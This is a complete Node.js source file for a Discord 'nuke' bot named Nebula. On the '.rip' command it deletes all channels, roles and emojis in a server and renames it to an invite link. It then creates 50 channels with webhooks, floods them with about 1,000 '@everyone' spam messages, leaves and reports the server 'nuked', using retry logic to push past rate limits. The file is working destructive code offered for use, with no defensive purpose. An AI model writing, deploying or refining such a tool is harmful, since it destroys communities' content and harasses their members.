const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');

dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildWebhooks,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and awaiting .rip command...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== RATE LIMIT HANDLER ======
async function handleRateLimit(promiseFn, maxRetries = 5) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = error.retry_after || 1000;
        console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms`);
        await new Promise(resolve => setTimeout(resolve, retryAfter));
        retries++;
        continue;
      } else {
        console.error(`[ERROR] ${error.message}`);
        return null;
      }
    }
  }
  return null;
}

// ====== BOT LOGIC ======
client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (message.content !== '.rip' || message.author.bot) return;

  const guild = message.guild;
  const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
  const channelName = 'neb-was-here';
  const webhookAvatar = 'https://i.imgur.com/6QbX6yA.png ';

  try {
    console.log('🧹 Starting cleanup...');

    // Delete all channels
    await Promise.all(guild.channels.cache.map(async (channel) => {
      const result = await handleRateLimit(() => channel.delete().catch(e => console.warn(`Channel del fail: ${e.message}`)));
      if (result) console.log(`🗑️ Deleted channel: ${channel.name}`);
    }));

    // Delete roles (except @everyone)
    await Promise.all(guild.roles.cache.map(async (role) => {
      if (role.name !== '@everyone' && !role.managed) {
        const result = await handleRateLimit(() => role.delete().catch(e => console.warn(`Role del fail: ${e.message}`)));
        if (result) console.log(`🛡️ Deleted role: ${role.name}`);
      }
    }));

    // Delete emojis
    await Promise.all(guild.emojis.cache.map(async (emoji) => {
      const result = await handleRateLimit(() => emoji.delete().catch(e => console.warn(`Emoji del fail: ${e.message}`)));
      if (result) console.log(`🖼️ Deleted emoji: ${emoji.name}`);
    }));

    // Rename server
    await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' }).catch(e => console.warn(`Guild rename fail: ${e.message}`)));
    console.log('📛 Server renamed.');

    // Create 50 channels
    const createdChannels = [];
    for (let i = 0; i < 50; i++) {
      const channel = await handleRateLimit(() =>
        guild.channels.create({ name: `${channelName}-${i + 1}` })
          .catch(e => console.warn(`Channel create fail: ${e.message}`))
      );
      if (channel) {
        createdChannels.push(channel);
        console.log(`🆕 Created channel: ${channel.name}`);
      }
    }

    if (createdChannels.length === 0) {
      console.error('❌ No channels created. Aborting.');
      return message.channel.send('❌ Failed to create any channels. Aborting.');
    }

    // Create webhooks
    const webhooks = [];
    for (const channel of createdChannels) {
      const hook = await handleRateLimit(() =>
        channel.createWebhook({ name: 'Nebula', avatar: webhookAvatar })
          .catch(e => console.warn(`Webhook create fail: ${e.message}`))
      );
      if (hook) {
        webhooks.push(hook);
        console.log(`📎 Created webhook in: ${channel.name}`);
      }
    }

    if (webhooks.length === 0) {
      console.error('❌ No webhooks created. Aborting spam.');
      return message.channel.send('❌ No webhooks could be created. Aborting.');
    }

    // Spam messages
    const totalMessages = 1000;
    const perHook = Math.ceil(totalMessages / webhooks.length);
    let sent = 0;

    console.log('🔥 Starting spam with webhooks...');

    const sendBatch = webhooks.map(webhook => async () => {
      for (let i = 0; i < perHook && sent < totalMessages; i++) {
        try {
          await handleRateLimit(() => webhook.send(spamMessage));
          sent++;
          if (sent % 100 === 0) console.log(`📨 Messages sent: ${sent}`);
        } catch (err) {
          console.error(`⚠️ Failed to send via webhook: ${err.message}`);
        }
        await new Promise(r => setTimeout(r, 50)); // small delay to avoid rate limit spikes
      }
    });

    // Run spam in parallel
    await Promise.all(sendBatch.map(fn => fn()));

    console.log(`✅ Sent ${sent}/${totalMessages} messages.`);

    // Leave server
    await handleRateLimit(() => guild.leave());
    console.log('🚪 Left server.');

    await message.channel.send(`✅ Successfully nuked \`${guild.name}\``);

  } catch (err) {
    console.error('🚨 Critical error during operation:', err.message);
    await message.channel.send(`❌ Error occurred: ${err.message}`);
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
